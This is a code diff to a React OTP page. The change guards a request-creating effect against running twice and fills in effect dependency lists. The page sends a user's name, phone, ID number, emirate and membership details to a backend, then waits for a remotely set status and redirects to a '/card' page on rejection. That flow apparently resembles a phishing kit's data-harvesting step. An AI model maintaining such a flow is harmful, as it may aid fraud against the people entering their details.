@@ -17,10 +17,14 @@ export default function OtpPage() {
   const [saved, setSaved] = useState(false);
   const [dots, setDots] = useState(0);
 
+  const didCreateRequest = useRef(false);
   const docIdRef = useRef<string | null>(null);
   const confCode = useRef(genCode());
 
   useEffect(() => {
+    if (didCreateRequest.current) return;
+    didCreateRequest.current = true;
+
     const payload = {
       name:              data.name          || "—",
       phone:             data.phone         || "—",
@@ -42,7 +46,16 @@ export default function OtpPage() {
         setSaved(true);
       })
       .catch(() => setSaved(true));
-  }, []);
+  }, [
+    data.delivery_date,
+    data.emirate,
+    data.id_number,
+    data.membership,
+    data.name,
+    data.phone,
+    setConfirmationCode,
+    setDocId,
+  ]);
 
   useEffect(() => {
     if (!saved || !docIdRef.current) return;
@@ -53,7 +66,7 @@ export default function OtpPage() {
       if (val?.status === "rejected") router.push("/card");
     });
     return () => off(appRef);
-  }, [saved]);
+  }, [router, saved]);
 
   useEffect(() => {
     const t = setInterval(() => setDots((d) => (d + 1) % 4), 600);
